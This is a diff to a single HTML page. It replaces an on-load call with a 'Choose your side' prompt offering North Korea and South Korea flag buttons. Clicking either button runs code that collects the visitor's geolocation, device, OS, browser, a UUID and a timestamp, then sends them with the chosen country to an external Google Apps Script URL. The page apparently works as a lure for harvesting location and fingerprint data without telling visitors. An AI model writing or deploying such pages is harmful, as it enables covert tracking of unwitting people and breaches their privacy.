@@ -17,9 +17,26 @@
       animation: blink 1s infinite;
     }
 
-    #data {
+    #buttons {
       margin-top: 20px;
+    }
+
+    .button {
       font-size: 20px;
+      padding: 10px 20px;
+      margin: 10px;
+      cursor: pointer;
+      background-color: red;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+
+    .button img {
+      width: 20px;
+      height: 15px;
+      margin-right: 10px;
+      vertical-align: middle;
     }
 
     @keyframes blink {
@@ -61,7 +78,7 @@
       };
     }
 
-    function getGeoLocation() {
+    function sendData(country) {
       const confidentialDiv = document.getElementById('confidential');
       const dataDiv = document.getElementById('data');
       let messageIndex = 0;
@@ -107,7 +124,7 @@
             var timestamp = new Date().toISOString();
 
             var scriptUrl = "https://script.google.com/macros/s/AKfycbzTqZTXXRolJY6ClLC_v9RjmWaeiVdfqoCz0BApRb7yr5rL8TuDDzNUpkAWteP4uzXY8w/exec";
-            var url = `${scriptUrl}?latitude=${latitude}&longitude=${longitude}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}&browser=${encodeURIComponent(deviceInfo.browser)}&uuid=${uuid}&timestamp=${encodeURIComponent(timestamp)}`;
+            var url = `${scriptUrl}?latitude=${latitude}&longitude=${longitude}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}&browser=${encodeURIComponent(deviceInfo.browser)}&uuid=${uuid}&timestamp=${encodeURIComponent(timestamp)}&country=${encodeURIComponent(country)}`;
 
             console.log(url); // Imprimir URL para depuración
 
@@ -119,10 +136,24 @@
         alert("Geolocation is not supported by this browser.");
       }
     }
+
+    function onButtonClick(country) {
+      document.getElementById('buttons').style.display = 'none';
+      sendData(country);
+    }
   </script>
 </head>
-<body onload="getGeoLocation()">
-  <div id="confidential"></div>
+<body>
+  <div id="confidential">Choose your side:</div>
+  <div id="buttons">
+    <button class="button" onclick="onButtonClick('North Korea')">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/4c/Flag_of_North_Korea.svg" alt="North Korea"> North Korea
+    </button>
+    <button class="button" onclick="onButtonClick('South Korea')">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/09/Flag_of_South_Korea.svg" alt="South Korea"> South Korea
+    </button>
+  </div>
   <div id="data" style="display: none;"></div>
 </body>
 </html>
+
